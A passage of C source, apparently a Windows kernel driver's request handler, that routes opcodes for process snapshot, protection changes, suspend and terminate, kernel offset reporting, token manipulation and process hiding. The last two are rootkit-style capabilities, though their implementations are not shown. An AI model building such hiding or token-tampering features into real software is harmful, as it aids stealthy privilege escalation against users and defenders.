    if (r.op > YGHV_PROC_OP_HIDE) return STATUS_INVALID_PARAMETER;

    InterlockedIncrement64(&g_proc_ops);

    /*
     * pid 4 and pid 0 need an explicit opt-in: they are the two objects whose
     * corruption takes the machine down instead of one process.
     */
    if ((r.pid == 4 || r.pid == 0) &&
        !(r.flags & YGHV_PROC_F_ALLOW_SYSTEM) &&
        r.op != YGHV_PROC_OP_SNAPSHOT &&
        r.op != YGHV_PROC_OP_OFFSETS &&
        r.op != YGHV_PROC_OP_SIG) {
        InterlockedIncrement64(&g_proc_fails);
        return STATUS_ACCESS_DENIED;
    }

    RtlZeroMemory(out, out_len);
    *info = YGHV_PROC_HDR_QWORDS * 8;

    switch (r.op) {
    case YGHV_PROC_OP_SNAPSHOT:
        st = yghv_proc_snapshot(o, out_len, (ULONG)r.arg0);
        break;

    case YGHV_PROC_OP_QUERY:
        st = yghv_proc_query(o, out_len, r.pid);
        break;

    case YGHV_PROC_OP_PROT:
        st = yghv_proc_set_prot(o, r.pid, (UINT64)r.arg0);
        break;

    case YGHV_PROC_OP_SUSPEND:
        st = yghv_proc_suspend(o, r.pid, r.arg0 != 0);
        break;

    case YGHV_PROC_OP_TERM:
        st = yghv_proc_term(o, r.pid, r.arg1, r.flags);
        break;

    case YGHV_PROC_OP_OFFSETS: {
        uint64_t stats[4];
        yghv_offsets_stats(stats);
        o[0] = 1;
        o[1] = stats[0];                    /* derived mask */
        o[2] = stats[1];                    /* validated mask */
        o[3] = stats[2];                    /* failures */
        o[4] = stats[3];                    /* build number */
        o[5] = g_yghv_off.thread_list_head;
        o[6] = g_yghv_off.token;
        o[7] = g_yghv_off.thread_list_entry;
        st = STATUS_SUCCESS;
        *info = 8 * 8;
        break;
    }

    case YGHV_PROC_OP_SIG: {
        uint64_t stats[10];
        yghv_sig_stats(stats);
        o[0] = 1;
        o[1] = stats[0];
        o[2] = stats[1];
        o[3] = stats[2];
        o[4] = stats[3];
        o[5] = stats[4];
        o[6] = stats[5];
        o[7] = stats[6];
        st = STATUS_SUCCESS;
        *info = 8 * 8;
        break;
    }

    case YGHV_PROC_OP_THREADS:
        st = yghv_proc_threads(o, out_len, r.pid, (ULONG)r.arg0);
        break;

    case YGHV_PROC_OP_TOKEN:
        st = yghv_proc_token(o, r.pid, (ULONG)r.arg1, (ULONG)r.arg0);
        break;

    case YGHV_PROC_OP_HIDE:
        st = yghv_proc_hide(o, r.pid, r.arg0 != 0);
        break;

    default:
        return STATUS_INVALID_PARAMETER;
    }

    if (!NT_SUCCESS(st)) {
        InterlockedIncrement64(&g_proc_fails);
        o[0] = 0;
        *info = YGHV_PROC_HDR_QWORDS * 8;
        return st;
    }

    return STATUS_SUCCESS;
}
